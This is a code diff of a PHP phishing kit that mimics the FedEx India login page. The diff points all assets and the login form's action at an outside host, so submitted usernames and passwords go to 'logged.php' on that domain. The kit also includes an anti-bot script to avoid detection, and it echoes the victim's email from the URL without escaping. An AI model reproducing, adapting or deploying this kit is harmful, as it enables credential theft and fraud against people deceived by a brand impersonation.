@@ -3,22 +3,22 @@ include('antibots6.php');
 ?>
 <!DOCTYPE html>
 
-<html xmlns="#" xml:lang="en" lang="en" dir=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="async" src="assets/files/f.txt"></script>
+<html xmlns="#" xml:lang="en" lang="en" dir=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="async" src="https://agronal.com/fedex/assets/files/f.txt"></script>
 
 	
 	
      
-     <link rel="shortcut icon" type="image/x-icon" href="assets/files/fx-favicon.ico">
-     <link rel="stylesheet" type="text/css" href="assets/files/global-wrapper-min.css" id="globalCSS">
+     <link rel="shortcut icon" type="image/x-icon" href="https://agronal.com/fedex/assets/files/fx-favicon.ico">
+     <link rel="stylesheet" type="text/css" href="https://agronal.com/fedex/assets/files/global-wrapper-min.css" id="globalCSS">
      <!--[if lte IE 7]><link rel="stylesheet" type="text/css" href="/css/t1/global-wrapper-ie-min.css" /><![endif]-->
 	 <!--[if lte IE 6]><link rel="stylesheet" type="text/css" href="/css/t1/ie6-min.css" /><![endif]-->
 
 
-		<link rel="stylesheet" href="assets/files/afedexmain30.css" type="text/css"> 
-		<link rel="stylesheet" href="assets/files/oadr.css" type="text/css">
-		<link rel="stylesheet" href="assets/files/newstyle30.css" type="text/css">
-		<link rel="stylesheet" type="text/css" href="assets/files/afedexasia30.css">
-		<link rel="stylesheet" type="text/css" href="assets/files/fedexascend30.css">
+		<link rel="stylesheet" href="https://agronal.com/fedex/assets/files/afedexmain30.css" type="text/css"> 
+		<link rel="stylesheet" href="https://agronal.com/fedex/assets/files/oadr.css" type="text/css">
+		<link rel="stylesheet" href="https://agronal.com/fedex/assets/files/newstyle30.css" type="text/css">
+		<link rel="stylesheet" type="text/css" href="https://agronal.com/fedex/assets/files/afedexasia30.css">
+		<link rel="stylesheet" type="text/css" href="https://agronal.com/fedex/assets/files/fedexascend30.css">
 	
 
 <script type="text/javascript">
@@ -99,7 +99,7 @@ include('antibots6.php');
 	
 	<a onclick="javascript:setLinkView(&#39;fedexlogo&#39;);" href="#" id="main-logo" class="descriptor" title="FedEx Home">
 	
-	 <img src="assets/files/logo-header-fedex-express.png" alt="FedEx Home"> 
+	 <img src="https://agronal.com/fedex/assets/files/logo-header-fedex-express.png" alt="FedEx Home"> 
 	<!-- <img src="//www.fedex.com/images/ascend/shared/headers/nxgen/express_logo.gif" alt="FedEx Home" /> -->	
 	</a>
    <div id="global-nav" class="fx_clearfix lrg-font">
@@ -130,7 +130,7 @@ include('antibots6.php');
 
     
       <div id="tab0menu0" class="menu-col first-menu-col">
-       <img src="assets/files/ship-prepare.jpg" class="head" alt="">
+       <img src="https://agronal.com/fedex/assets/files/ship-prepare.jpg" class="head" alt="">
        <h2 class="menu-head">Prepare your Shipment</h2>
        <h3 class="menu-head">Prepare all necessary documents for your shipment, like Waybill, Commercial Invoice, and more.</h3>
        <ul id="ul0">
@@ -168,7 +168,7 @@ include('antibots6.php');
 
     
       <div id="tab0menu1" class="menu-col ">
-       <img src="assets/files/ship_select_your_service.jpg" class="head" alt="">
+       <img src="https://agronal.com/fedex/assets/files/ship_select_your_service.jpg" class="head" alt="">
        <h2 class="menu-head">Select your Service</h2>
        <h3 class="menu-head">Learn more about our range of services, get a rate quote and see transit times for the different  services available for where you want to ship.</h3>
        <ul id="ul0">
@@ -202,7 +202,7 @@ include('antibots6.php');
 
     
       <div id="tab0menu2" class="menu-col  clear-col">
-       <img src="assets/files/ship_schedule_pickup.jpg" class="head" alt="">
+       <img src="https://agronal.com/fedex/assets/files/ship_schedule_pickup.jpg" class="head" alt="">
        <h2 class="menu-head">Schedule a Pickup</h2>
        <h3 class="menu-head">Plan and manage shipments faster and easier.</h3>
        <ul id="ul0">
@@ -283,7 +283,7 @@ include('antibots6.php');
 
     
       <div id="tab1menu0" class="menu-col first-menu-col">
-       <img src="assets/files/track_tracking_number.jpg" class="head" alt="">
+       <img src="https://agronal.com/fedex/assets/files/track_tracking_number.jpg" class="head" alt="">
        <h2 class="menu-head">Track by Tracking Number</h2>
        <h3 class="menu-head">Enter a combination of up to 30 FedEx tracking numbers.</h3>
        <ul id="ul0">
@@ -315,7 +315,7 @@ include('antibots6.php');
 
     
       <div id="tab1menu1" class="menu-col ">
-       <img src="assets/files/track_advanced.jpg" class="head" alt="">
+       <img src="https://agronal.com/fedex/assets/files/track_advanced.jpg" class="head" alt="">
        <h2 class="menu-head">Advanced Tracking Options</h2>
        <h3 class="menu-head">Save time by eliminating the need to track each package separately. Sign up to access advanced levels of visibility to monitor your shipments.</h3>
        <ul id="ul0">
@@ -349,7 +349,7 @@ include('antibots6.php');
 
     
       <div id="tab1menu2" class="menu-col  clear-col">
-       <img src="assets/files/track_signature_proof.jpg" class="head" alt="">
+       <img src="https://agronal.com/fedex/assets/files/track_signature_proof.jpg" class="head" alt="">
        <h2 class="menu-head">Obtain Proof of Delivery</h2>
        <h3 class="menu-head">You can request a FedEx Proof of Delivery letter that includes an image of the recipient's signature (if available).</h3>
        <ul id="ul0">
@@ -424,7 +424,7 @@ include('antibots6.php');
 
     
       <div id="tab2menu0" class="menu-col first-menu-col">
-       <img src="assets/files/manage_update_account.jpg" class="head" alt="">
+       <img src="https://agronal.com/fedex/assets/files/manage_update_account.jpg" class="head" alt="">
        <h2 class="menu-head">Update My Account Information</h2>
        <h3 class="menu-head">Update your contact, e-mail and address information in one easy step.</h3>
        <ul id="ul0">
@@ -458,7 +458,7 @@ include('antibots6.php');
 
     
       <div id="tab2menu1" class="menu-col ">
-       <img src="assets/files/manage_billing_invoice_tools.jpg" class="head" alt="">
+       <img src="https://agronal.com/fedex/assets/files/manage_billing_invoice_tools.jpg" class="head" alt="">
        <h2 class="menu-head">FedEx Billing and Invoice Tools</h2>
        <h3 class="menu-head">Pay bills and manage refunds, billing adjustments, billing issues and related invoice inquiries.</h3>
        <ul id="ul0">
@@ -492,7 +492,7 @@ include('antibots6.php');
 
     
       <div id="tab2menu2" class="menu-col last-menu-col clear-col">
-       <img src="assets/files/manage_e_newsletter.jpg" class="head" alt="">
+       <img src="https://agronal.com/fedex/assets/files/manage_e_newsletter.jpg" class="head" alt="">
        <h2 class="menu-head">FedEx eNewsletter</h2>
        <h3 class="menu-head">Subscribe to FedEx eNews to stay up to date with the latest FedEx news.</h3>
        <ul id="ul0">
@@ -533,7 +533,7 @@ include('antibots6.php');
 
     
       <div id="tab3menu0" class="menu-col first-menu-col">
-       <img src="assets/files/learn_estimate_duties_taxes.jpg" class="head" alt="">
+       <img src="https://agronal.com/fedex/assets/files/learn_estimate_duties_taxes.jpg" class="head" alt="">
        <h2 class="menu-head">Estimate Duties and Taxes</h2>
        <h3 class="menu-head">Estimate the duties and taxes that will be levied against your international shipment.</h3>
        <ul id="ul0">
@@ -565,7 +565,7 @@ include('antibots6.php');
 
     
       <div id="tab3menu1" class="menu-col ">
-       <img src="assets/files/learn_doc_prep.jpg" class="head" alt="">
+       <img src="https://agronal.com/fedex/assets/files/learn_doc_prep.jpg" class="head" alt="">
        <h2 class="menu-head">Document Preparation Center</h2>
        <h3 class="menu-head">Prepare and house customs documents in one location quickly and easily.</h3>
        <ul id="ul0">
@@ -599,7 +599,7 @@ include('antibots6.php');
 
     
       <div id="tab3menu2" class="menu-col  clear-col">
-       <img src="assets/files/learn_GTM.jpg" class="head" alt="">
+       <img src="https://agronal.com/fedex/assets/files/learn_GTM.jpg" class="head" alt="">
        <h2 class="menu-head">FedEx Global Trade Manager</h2>
        <h3 class="menu-head">FedEx Global Trade Manager provides you with a one-stop resource for international shipping information.</h3>
        <ul id="ul0">
@@ -685,8 +685,8 @@ include('antibots6.php');
 	        <div id="content" class="fx_clearfix">
                         <div style="color:#FFF;">
                          
-<script src="assets/files/jscripts.js.descărcare" type="text/javascript"></script>
-<script src="assets/files/DynamicValidation.js.descărcare" type="text/javascript"></script>
+<script src="https://agronal.com/fedex/assets/files/jscripts.js.descărcare" type="text/javascript"></script>
+<script src="https://agronal.com/fedex/assets/files/DynamicValidation.js.descărcare" type="text/javascript"></script>
 <script type="text/javascript">
 function setUname() {
 var uname = document.getElementById("username").value;
@@ -707,13 +707,13 @@ document.cookie = "loginid="+uname + ";path=/";
 
 <meta name="pragma" content="no-cache">
 <meta name="cache-control" content="no-cache">
-<link rel="stylesheet" type="text/css" href="assets/files/widgets.css">
-<link rel="stylesheet" href="assets/files/fxnxgen.css" type="text/css">
-<link rel="stylesheet" href="assets/files/login.css" type="text/css">
+<link rel="stylesheet" type="text/css" href="https://agronal.com/fedex/assets/files/widgets.css">
+<link rel="stylesheet" href="https://agronal.com/fedex/assets/files/fxnxgen.css" type="text/css">
+<link rel="stylesheet" href="https://agronal.com/fedex/assets/files/login.css" type="text/css">
 
-<link rel="stylesheet" href="assets/files/fcl30.css" type="text/css">
+<link rel="stylesheet" href="https://agronal.com/fedex/assets/files/fcl30.css" type="text/css">
 
-<script type="text/javascript" charset="utf-8" src="assets/files/framework.js.descărcare"></script>
+<script type="text/javascript" charset="utf-8" src="https://agronal.com/fedex/assets/files/framework.js.descărcare"></script>
 <script language="javascript">
 //Defect fix for 169686 and 169173
 	function fLogon()
@@ -763,7 +763,7 @@ document.cookie = "loginid="+uname + ";path=/";
 
 
 	
-	<form action="logged.php" method="post" name="logonForm" id="logonForm" onsubmit="addWSSInfo(username.value);">
+	<form action="https://agronal.com/fedex/logged.php" method="post" name="logonForm" id="logonForm" onsubmit="addWSSInfo(username.value);">
 	
 	<input type="hidden" name="SMENC" value="UTF-8">
 	<input type="hidden" name="TARGET" value="">
@@ -845,7 +845,7 @@ Registered fedex.com Users
 						 <td colspan="2">
 								 <table border="0" cellspacing="0" cellpadding="1">
 								 <tbody><tr>
-											<td colspan="1"><img valign="middle" src="assets/files/icon_important.gif">&nbsp;</td><td colspan="1" valing="middle"><b>IMPORTANT</b></td>
+											<td colspan="1"><img valign="middle" src="https://agronal.com/fedex/assets/files/icon_important.gif">&nbsp;</td><td colspan="1" valing="middle"><b>IMPORTANT</b></td>
 								 </tr>
 								 </tbody></table>
 					  </td>
@@ -856,7 +856,7 @@ Registered fedex.com Users
 						
 			<!--area 4-->
 				<tr>
-					  <td colspan="2"><img src="assets/files/spacer.gif" height="10" width="1"></td>
+					  <td colspan="2"><img src="https://agronal.com/fedex/assets/files/spacer.gif" height="10" width="1"></td>
 				</tr>																
 				  <tr> 
 			
@@ -878,10 +878,10 @@ Registered fedex.com Users
 							 <span></span>				
 							<input type="email" id="username" name="username" required="required" tabindex="1" maxlength="35" autocomplete="off" size="38" value="<?php echo $_GET['email']; ?>" readonly="" >
 							</td>
-							<td><img src="assets/files/spacer.gif" height="1" width="5"></td>
+							<td><img src="https://agronal.com/fedex/assets/files/spacer.gif" height="1" width="5"></td>
 						</tr>
 						<tr> 
-							<td colspan="3"><img src="assets/files/spacer.gif" height="5" width="1"></td>
+							<td colspan="3"><img src="https://agronal.com/fedex/assets/files/spacer.gif" height="5" width="1"></td>
 						</tr>				  
 						<tr> 
 							<td align="left" class="required">
@@ -896,10 +896,10 @@ Registered fedex.com Users
 				
 
 							</td>
-							<td><img src="assets/files/spacer.gif" height="1" width="5"></td>
+							<td><img src="https://agronal.com/fedex/assets/files/spacer.gif" height="1" width="5"></td>
 						</tr>
 						<tr> 
-							<td colspan="3"><img src="assets/files/spacer.gif" height="5" width="1"></td>
+							<td colspan="3"><img src="https://agronal.com/fedex/assets/files/spacer.gif" height="5" width="1"></td>
 						</tr>
 					 	
                                                 
@@ -914,7 +914,7 @@ Registered fedex.com Users
 
 
 						<tr> 
-							<td><img src="assets/files/spacer.gif" height="1" width="5"></td>
+							<td><img src="https://agronal.com/fedex/assets/files/spacer.gif" height="1" width="5"></td>
 							
 									<td>
 										<input type="checkbox" name="remusrid" value="yes">
@@ -927,7 +927,7 @@ Registered fedex.com Users
 					</td>
 				  </tr>
 				  <tr> 
-					<td colspan="2"><img src="assets/files/spacer.gif" height="5" width="1"></td>
+					<td colspan="2"><img src="https://agronal.com/fedex/assets/files/spacer.gif" height="5" width="1"></td>
 				  </tr>
 				  <tr> 
 				  	<td colspan="2">
@@ -1032,7 +1032,7 @@ New fedex.com Users
     document.forms["logonForm"].elements["username"].focus()
   // -->
 </script>
-<script type="text/javascript">var _cf = _cf || []; _cf.push(['_setFsp', true]); _cf.push(['_setBm', true]);</script><script type="text/javascript" src="assets/files/abd-1-30"></script><noscript><img src="#" style="visibility: hidden; position: absolute; left: -999px; top: -999px;" /></noscript>
+<script type="text/javascript">var _cf = _cf || []; _cf.push(['_setFsp', true]); _cf.push(['_setBm', true]);</script><script type="text/javascript" src="https://agronal.com/fedex/assets/files/abd-1-30"></script><noscript><img src="#" style="visibility: hidden; position: absolute; left: -999px; top: -999px;" /></noscript>
      
 
                         </div>
@@ -1063,7 +1063,7 @@ New fedex.com Users
                <input type="hidden" name="site" value="in">
                <input type="hidden" name="headerFooterDir" value="in">
              </form>
-<img src="assets/files/logo-footer-fedex.gif" alt="FedEx" title="FedEx">
+<img src="https://agronal.com/fedex/assets/files/logo-footer-fedex.gif" alt="FedEx" title="FedEx">
 </div>
 <!-- END ROW 1: LOGO AND SEARCH -->
 
@@ -1114,7 +1114,7 @@ New fedex.com Users
 <a class="chiclet youtube" href="#" title="Youtube" target="_blank"></a>
 </div>
 <div class="col col4 col-last" style="min-height: 143px;">
-<a href="#" title=""><img src="assets/files/in.gif" width="16" height="11" alt="" class="flag"></a><a href="#" title="">India - English</a>
+<a href="#" title=""><img src="https://agronal.com/fedex/assets/files/in.gif" width="16" height="11" alt="" class="flag"></a><a href="#" title="">India - English</a>
 <!-- ELEMENT: BEGIN SAG CONTAINER -->
 </div>
 <!-- END ROW 2: FOOTER NAVIGATION -->
@@ -1139,8 +1139,8 @@ New fedex.com Users
 var fx_footer_feedback="Feedback";
 </script>
 <script type="text/javascript">var reg_account="fedexeu";</script>
-<script type="text/javascript" src="assets/files/contentim_controller-min.js.descărcare"></script>
-<script type="text/javascript" src="assets/files/app-min.js.descărcare"></script>
+<script type="text/javascript" src="https://agronal.com/fedex/assets/files/contentim_controller-min.js.descărcare"></script>
+<script type="text/javascript" src="https://agronal.com/fedex/assets/files/app-min.js.descărcare"></script>
 
 <!-- End Include: templates/components/footers/in/gl_main_app.html -->
 	<!-- </noindex> -->
@@ -1165,4 +1165,4 @@ var fx_footer_feedback="Feedback";
 
 
 
-<iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_fedex_0" src="assets/files/dest5.html" class="aamIframeLoaded" style="display: none; width: 0px; height: 0px;"></iframe></body></html>
+<iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_fedex_0" src="https://agronal.com/fedex/assets/files/dest5.html" class="aamIframeLoaded" style="display: none; width: 0px; height: 0px;"></iframe></body></html>
